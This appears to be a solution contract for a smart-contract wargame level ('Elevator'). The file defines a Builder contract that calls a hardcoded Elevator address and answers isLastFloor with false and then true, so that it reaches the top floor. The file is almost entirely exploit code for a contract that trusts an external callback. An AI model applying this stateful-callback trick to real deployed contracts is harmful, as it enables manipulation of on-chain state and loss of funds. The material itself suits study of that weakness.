pragma solidity ^0.6.0;

import "./default.sol";

contract Builder {
    Elevator el = Elevator(0xeEe0D67A82a50A4b1CEa802116277D6c0AD0dC28);
    bool public x = false;

    function attack() public {
        el.goTo(5);
    }

    function isLastFloor(uint256 floor) public returns (bool) {
        if (!x) {
            x = true;
            return false;
        } else {
            return true;
        }
    }
}
